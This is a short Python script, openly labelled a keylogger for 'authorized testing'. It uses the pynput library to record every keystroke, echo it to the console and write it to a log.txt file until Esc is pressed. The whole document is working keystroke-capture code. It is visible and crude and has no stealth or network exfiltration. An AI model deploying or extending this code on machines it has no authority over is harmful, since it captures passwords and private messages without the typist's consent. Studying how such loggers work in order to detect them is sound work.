#!/usr/bin/env python3
# Keylogger using pynput module
# For personal/authorized testing only
# Works on Linux Debian (aarch64)

import pynput
from pynput.keyboard import Key, Listener

keys = []


def on_press(key):

    keys.append(key)
    write_file(keys)

    try:
        print("alphanumeric key {0} pressed".format(key.char))

    except AttributeError:
        print("special key {0} pressed".format(key))


def write_file(keys):

    with open("log.txt", "w") as f:
        for key in keys:

            # Removing ''
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)
                # Explicitly adding a space after
                # every keystroke for readability
                f.write(" ")


def on_release(key):

    print("{0} released".format(key))
    if key == Key.esc:
        # Stop the listener
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
